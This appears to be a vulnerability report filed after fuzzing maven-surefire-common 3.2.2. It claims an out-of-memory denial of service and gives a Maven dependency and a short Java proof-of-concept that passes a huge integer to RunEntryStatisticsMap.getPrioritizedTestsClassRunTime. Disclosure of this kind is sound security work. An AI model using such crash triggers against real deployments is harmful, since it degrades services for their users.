When I test the latest version(3.2.2) of maven-surefire-common by CIFuzz，a OOM security issue was found, it caused when put a big number in JSONArray, may cause denial of service issues in applications via the follow code:

pom
```
<dependency>
   <groupId>org.apache.maven.surefire</groupId>
   <artifactId>maven-surefire-common</artifactId>
   <version>3.2.2</version>
</dependency>
```
code
```
import org.apache.maven.surefire.api.runorder.RunEntryStatisticsMap;

import java.util.ArrayList;

public class MavenSurefire_OOM {

    public static void main(String[] args) {
        try {
            RunEntryStatisticsMap runEntryStatisticsMap = new RunEntryStatisticsMap();
            runEntryStatisticsMap.getPrioritizedTestsClassRunTime(new ArrayList(), 1832742252);
        } catch (Exception e) {
        }
    }
}
```
